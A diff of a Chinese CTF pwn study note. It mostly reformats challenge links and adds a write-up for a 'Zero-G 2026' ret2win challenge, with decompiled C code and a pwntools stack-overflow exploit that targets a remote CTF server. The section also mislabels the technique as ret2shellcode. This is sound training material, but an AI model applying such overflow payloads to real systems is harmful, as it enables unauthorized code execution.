@@ -136,7 +136,13 @@ ret2text的原理
 
 **演示动画**
 
-这里有关于栈的演示动画[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/栈.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/栈.html)
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="动画链接"}
+
+[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/栈.html](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/栈.html)
+
+::
+
+这里有关于栈的演示动画
 
 ---
 
@@ -366,7 +372,13 @@ r.interactive()
 
 这个我也画了动画解析
 
-[SWPUCTF 2021 新生赛\]gift_pwn/PWN 栈对齐.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[SWPUCTF 2021 新生赛]gift_pwn/PWN 栈对齐.html)
+
+
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="动画链接"}
+
+[SWPUCTF 2021 新生赛\]gift_pwn](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈)
+
+::
 
 
 
@@ -413,7 +425,13 @@ r.interactive()
 
 ### 3.[SWPUCTF 2022 新生赛]Does your nc work？
 
-题目连接:https://www.nssctf.cn/problem/3875
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+https://www.nssctf.cn/problem/3875
+
+::
+
+
 
 ![image-20260424095647965](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260424113239689-1838418061.png)
 
@@ -456,7 +474,11 @@ nc node5.anna.nssctf.cn 22113 #nc 服务器,端口
 
 ### 4.[CISCN 2019华北]PWN1
 
-题目链接:https://www.nssctf.cn/problem/100
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+https://www.nssctf.cn/problem/100
+
+::
 
 main函数
 ![image-20260424102717475](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260424113237408-341699576.png)
@@ -574,7 +596,11 @@ r.interactive()
 
 ### 5.[BJDCTF 2020]babystack
 
-题目链接：https://www.nssctf.cn/problem/705
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+https://www.nssctf.cn/problem/705
+
+::
 
 ![image-20260425162931964](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260426214244773-75313604.png)
 
@@ -620,7 +646,13 @@ r.interactive()
 
 ### 6.[BJDCTF 2020]babystack2.0
 
-题目链接：https://www.nssctf.cn/problem/705
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+https://www.nssctf.cn/problem/709
+
+::
+
+
 
 这题和刚刚那题有点区别就是出现了对nbytes的验证
 
@@ -665,7 +697,13 @@ r.interactive()
 
 ### 7.[watevrCTF 2019]Voting Machine 1
 
-题目链接：https://www.nssctf.cn/problem/85
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+https://www.nssctf.cn/problem/85
+
+::
+
+
 
 ![image-20260427093625333](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185020685-1055473810.png)
 
@@ -740,3 +778,72 @@ payload = b'a' * offset +p64(ret) +p64(0x400807)
 r.sendline(payload)
 r.interactive()
 ```
+
+---
+
+### 8.[Zero-G 2026] pwn1-Starport Ret2win
+
+简单的栈溢出,ret2shellcode
+
+::alert{type="question"}
+[附件下载,点击链接跳转](https://gitee.com/ASUS_HACKED/cybersecurity/tree/%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/Zero-G_2026)
+
+::
+
+#### 0x01 分析程序
+
+该程序为64位程序 
+发现栈溢出read读取超过buf数组。
+
+
+
+```c
+int vuln()
+{
+  char buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  puts("ZeroG Starport Maintenance Console");
+  puts("Input access token:");
+  read(0, buf, 0xC8uLL);
+  return puts("[-] Access token rejected.");
+}
+```
+
+win函数发现cat flag
+
+```c
+void __noreturn win()
+{
+  const char *s; // [rsp+8h] [rbp-8h]
+
+  s = getenv("GZCTF_FLAG");
+  puts("[+] Maintenance channel unlocked.");
+  if ( s && *s )
+    puts(s);
+  else
+    puts("flag{local_test_flag}");
+  fflush(stdout);
+  _exit(0);
+}
+```
+
+---
+
+#### 0x02 攻击链EXP
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level = 'debug')
+
+#r = process('./starport_ret2win')
+r = remote('43.108.37.178',33349)
+win = 0x04011E2
+offset = 72
+ret = 0x04012EB
+
+payload = b'a'*offset+p64(ret)+p64(win)
+#gdb.attach(r)
+r.sendline(payload)
+r.interactive()
+```
+
